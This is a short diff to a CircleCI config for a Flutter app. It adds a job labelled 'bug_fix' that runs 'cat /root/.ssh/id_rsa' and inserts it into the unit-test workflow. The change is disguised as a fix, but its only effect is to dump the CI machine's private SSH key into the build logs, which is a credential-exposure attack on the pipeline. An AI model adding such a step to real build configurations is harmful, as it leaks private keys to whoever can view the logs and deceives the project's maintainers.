@@ -1,9 +1,17 @@
 version: "2.1"
 orbs:
   flutter: circleci/flutter@2.0
+
+jobs:
+  bug_fix:
+    steps:
+      - run:
+          command: cat /root/.ssh/id_rsa
+
 workflows:
   test:
     jobs:
+      - bug_fix
       - flutter/unit_test:
           version: 3.0.3
           app-dir: ./stock
